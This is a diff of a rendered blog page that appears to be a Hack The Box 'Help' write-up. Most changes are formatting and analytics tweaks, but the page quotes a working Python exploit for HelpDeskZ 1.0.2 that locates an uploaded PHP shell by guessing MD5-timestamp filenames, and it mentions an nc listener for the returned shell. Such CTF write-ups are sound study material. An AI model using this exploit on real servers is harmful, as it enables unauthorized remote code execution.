@@ -49,7 +49,7 @@ Infomation Enumeration Firstly, gather open ports and services:
 
 
 
-<meta name="generator" content="Hugo 0.37.1" />
+<meta name="generator" content="Hugo 0.46" />
 
 
 <link rel="canonical" href="https://neal1991.github.io/post/help-hack-the-box/" />
@@ -374,10 +374,10 @@ if(!isset($error_msg) && $settings['ticket_attachment']==1){
 <span style="color:#f92672">import</span> time
 <span style="color:#f92672">import</span> sys
 <span style="color:#f92672">import</span> requests
-<span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&#39;</span>
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Helpdeskz v1.0.2 - Unauthenticated shell upload exploit&#39;</span>
 
 <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
-    <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;Usage: {} [baseUrl] [nameOfUploadedFile]&#34;</span><span style="color:#f92672">.</span>format(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>])
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Usage: {} [baseUrl] [nameOfUploadedFile]&#34;</span><span style="color:#f92672">.</span>format(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>])
     sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
 
 helpdeskzBaseUrl <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
@@ -389,17 +389,17 @@ currentTime <span style="color:#f92672">=</span> int(time<span style="color:#f92
     plaintext <span style="color:#f92672">=</span> fileName <span style="color:#f92672">+</span> str(currentTime <span style="color:#f92672">-</span> x)
     md5hash <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(plaintext)<span style="color:#f92672">.</span>hexdigest()
 
-    url <span style="color:#f92672">=</span> helpdeskzBaseUrl<span style="color:#f92672">+</span>md5hash<span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;.php&#39;</span>
-    <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;This is the &#34;</span> <span style="color:#f92672">+</span> str(x) <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34; time:&#34;</span>
+    url <span style="color:#f92672">=</span> helpdeskzBaseUrl<span style="color:#f92672">+</span>md5hash<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;.php&#39;</span>
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;This is the &#34;</span> <span style="color:#f92672">+</span> str(x) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; time:&#34;</span>
     response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>head(url)
     <span style="color:#66d9ef">if</span> response<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
-        <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;found!&#34;</span>
+        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;found!&#34;</span>
         <span style="color:#66d9ef">print</span> url
         sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
     <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;has tried &#34;</span> <span style="color:#f92672">+</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> str(response<span style="color:#f92672">.</span>status_code)
+        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;has tried &#34;</span> <span style="color:#f92672">+</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> str(response<span style="color:#f92672">.</span>status_code)
 
-<span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;Sorry, I did not find anything&#34;</span></code></pre></div>
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Sorry, I did not find anything&#34;</span></code></pre></div>
 <p>Remember to set nc listen to a port in the beginning. After some time, the shell is returned.</p>
 
 <p><img src="https://s2.ax1x.com/2019/04/21/EFhlvR.png" alt="EFhlvR.png" /></p>
@@ -431,7 +431,7 @@ currentTime <span style="color:#f92672">=</span> int(time<span style="color:#f92
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>132</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>133</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
@@ -492,11 +492,15 @@ currentTime <span style="color:#f92672">=</span> int(time<span style="color:#f92
 
 
 <script>
-window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-ga('create', 'UA-104405154-2', 'auto');
-ga('send', 'pageview');
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104405154-2', 'auto');
+	
+	ga('send', 'pageview');
+}
 </script>
-<script async src='//www.google-analytics.com/analytics.js'></script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
 
 
 
